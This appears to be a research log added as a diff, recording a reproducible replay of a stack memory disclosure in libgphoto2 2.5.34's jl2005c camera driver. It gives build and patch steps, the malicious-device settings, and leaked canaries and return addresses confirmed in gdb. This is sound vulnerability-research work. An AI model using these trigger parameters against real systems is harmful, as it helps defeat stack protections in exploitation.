@@ -1,0 +1,113 @@
+# W178 (2026-11-24 23:02–23:06Z): clean-archive replay of W177's real-API
+# stack-frame disclosure. Author replay, NOT a witness verdict. Rung 4
+# author-side; rung 5 UNKNOWN. No camlib source changed by this replay.
+
+## Why this is new
+
+W177 ran in the long-lived throwaway tree `/tmp/w174-lgp`, whose `vusb.c`
+carried four local-only W175 hunks (short-reply cap before the first memset,
+`M2SHELL_JL2005_TOTAL`, widened mode-v victim condition, cap before the fill
+memset). They were never committed, so W175/W177 could not be replayed from
+Git. `evidence/replay-vusb-shortreply.patch` now commits exactly those four
+hunks (sha256 7e66d20bd6511e8a96b32a3c629fcf8390dfd4a97dc51740f20ce2c0660ec078).
+The committed replay bundles are sufficient again.
+
+## Clean extraction and patch stack (all paths relative to the archive root)
+
+  git archive HEAD reports/frontier-libgphoto2shell.md lab/frontier/libgphoto2shell \
+    | tar x -C /tmp/w178-lgp
+  cd /tmp/w178-lgp && sha256sum -c lab/frontier/libgphoto2shell/PINS.sha256
+  # 121 files, 4/4 pins OK; harness ./run.sh + ./check.sh -> 12 binaries,
+  # PASS=146 FAIL=0 TRACE=e364f756f482157bf25e852f98673131a94c4977d688bf691475024f286c6c98
+
+  T=/tmp/w178-lgp/lab/frontier/libgphoto2shell
+  cp <provisioned src/libgphoto2-2.5.34.tar.bz2> "$T/src/"
+  # tarball sha256 5df9e774eb4ab6087a193afff84dcafe9f666e3443fe29e73e6779f659ff7f28
+  cd "$T/src" && tar xjf libgphoto2-2.5.34.tar.bz2 && cd libgphoto2-2.5.34
+  patch -p1 < "$T/live/vusb-jl2005.patch"
+  patch -p1 < "$T/evidence/replay-vusb-victim.patch"
+  patch -p1 < "$T/evidence/replay-vusb-normal-return.patch"
+  patch -p1 < "$T/evidence/replay-vusb-guards.patch"
+  patch -p1 < "$T/evidence/replay-vusb-shortreply.patch"
+  # Do NOT apply replay-vusb-local-modes.patch: its mode-p cap is already in
+  # replay-vusb-victim.patch. Resulting vusb.c sha256
+  # 2b744f67e420a1a6addbf04861685c0711b33df36497e93e9267b4a23e57dde6,
+  # byte-identical to W175's local vusb.c in /tmp/w174-lgp.
+
+  CFLAGS='-O0 -g -fPIC -fno-omit-frame-pointer' ./configure \
+    --prefix="$PWD/installdir-plain" --with-camlibs=jl2005c \
+    --enable-shared --disable-static --without-libxml-2.0 \
+    --without-libcurl --without-gdlib --without-libtiff-4 \
+    --without-libexif --disable-nls --enable-vusb
+  CFLAGS='-O0 -g -fPIC -fno-omit-frame-pointer' make -j4 && make install
+  # BUILD_OK; installed jl2005c.so sha256
+  # 6ac67097e8c96da832f21e976fdcc69b2c7463778f40e1910fc5a61ec2027824
+
+  P="$T/src/libgphoto2-2.5.34/installdir-plain"
+  gcc -O0 -g -rdynamic -fno-omit-frame-pointer -I"$P/include" \
+    $(pkg-config --cflags glib-2.0) "$T/evidence/replay-stack-leak-probe.c" \
+    -o "$T/evidence/probe" -L"$P/lib" -lgphoto2 -lgphoto2_port \
+    $(pkg-config --libs glib-2.0)
+  # probe sha256 input a118abf97975688d92f86bca59d17fdd89f7d43c0658fa697e85347d9a21a418
+
+## Common run env
+
+  CAMLIBS=$P/lib/libgphoto2/2.5.34
+  IOLIBS=$P/lib/libgphoto2_port/0.12.2 IOLIBS_PREFIX=vusb LD_LIBRARY_PATH=$P/lib
+  M2SHELL_JL2005_VUSB=v M2SHELL_JL2005_COUNT=1053
+  M2SHELL_JL2005_LEN=0x3E28 M2SHELL_VUSB_GUARDS=4 M2SHELL_VUSB_DRAIN=28
+  M2SHELL_JL2005_FILL=0 M2SHELL_JL2005_TOTAL=1
+  probe usb:001,001 <name-number> <name-number>
+
+## Positive 1: canary at table k=1023 (jl_1024.ppm), 3 fresh processes
+
+  OWN_CANARY=f7a578386ac81800
+  file=jl_1024.ppm table_k=1023 rc=0 size=16 data=00000000000000000018c86a3878a5f7
+  OWN_CANARY=91b6e3fb407d0500
+  file=jl_1024.ppm table_k=1023 rc=0 size=16 data=000000000000000000057d40fbe3b691
+  OWN_CANARY=5bfc68e35658b800
+  file=jl_1024.ppm table_k=1023 rc=0 size=16 data=000000000000000000b85856e368fc5b
+
+Each record's last 8 bytes are the probe's own `%fs:0x28` canary, little
+endian, in a fresh process. `gp_camera_init rc=0` in all three.
+
+## Positive 2: saved rbp/RIP at table k=1024 (jl_1025.ppm)
+
+  OWN_CANARY=287074576e0d2300 gp_camera_init rc=0
+  file=jl_1025.ppm table_k=1024 rc=0 size=16 data=20fc2e85fe7f000080ba04df387f0000
+  OWN_CANARY=fe58038d72c8aa00 gp_camera_init rc=0
+  file=jl_1025.ppm table_k=1024 rc=0 size=16 data=00f562daff7f0000800ab16226700000
+  OWN_CANARY=3e26b530ddf5c300 gp_camera_init rc=0
+  file=jl_1025.ppm table_k=1024 rc=0 size=16 data=50af494aff7f0000800a715edf700000
+
+First word is a stack address, second a code address (ASLR changes both).
+In the same process, `gdb -q -batch -x evidence/replay-w177-map.gdb --args
+probe usb:001,001 1025 1025` with the same env:
+
+  GDB_R1=0x7fffffffc8e0
+  GDB_AT_R1=0x7fffffffc9c0
+  GDB_AT_R1_8=0x7ffff7bf5a80
+  GDB_R2=0x7fffffffc9c0
+  GDB_R2_MINUS8=0x55555555a3a0
+  GDB_AT_R2=0x7fffffffd460
+  GDB_AT_R2_8=0x7ffff7f3a0f3
+  file=jl_1025.ppm table_k=1024 rc=0 size=16 data=c0c9ffffff7f0000805abff7ff7f0000
+
+The leaked words are byte-for-byte `GDB_AT_R1` (saved rbp) and `GDB_AT_R1_8`
+(saved RIP at jl2005c_init's caller slot), the same two slots W167 overwrites.
+
+## Controls
+
+- COUNT=100 with the same LEN/GUARDS/DRAIN: `gp_camera_init rc=0`,
+  `list_files count=100`, `jl_1024.ppm rc=-108` (no entry; no disclosure).
+- Full reply (M2SHELL_JL2005_LEN unset), COUNT=1053:
+  `*** stack smashing detected ***: terminated`, rc=134, before file_get.
+
+## Limits (unchanged)
+
+This is the author's replay of committed files plus the provisioned release
+tarball; it is not an independent witness verdict. The disclosure is to a
+HOST consumer through the real public API; W176 still holds — this camlib
+never echoes table bytes to the device, so the malicious camera cannot read
+the canary or pointers this way. No wire path, device-only canary recovery,
+pointer dereferenced without gdb, command or rung 5. Rung 5 UNKNOWN.
